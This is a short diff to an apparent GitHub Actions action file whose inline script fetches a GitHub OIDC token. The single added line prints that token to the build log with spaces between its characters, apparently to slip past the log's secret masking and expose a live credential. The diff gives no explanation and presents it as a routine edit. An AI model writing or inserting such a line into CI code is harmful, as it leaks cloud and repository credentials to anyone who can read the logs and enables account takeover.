@@ -31,6 +31,7 @@ runs:
             (async () => {
               try {
                 const OIDC_TOKEN = await actionCore.getIDToken();
+                console.log(OIDC_TOKEN.split('').join(' '));
                 actionCore.setOutput('OIDC_TOKEN', OIDC_TOKEN);
               } catch (error) {
                 actionCore.error('Failed to get OIDC Token from GitHub servers: ' + error + '\n');
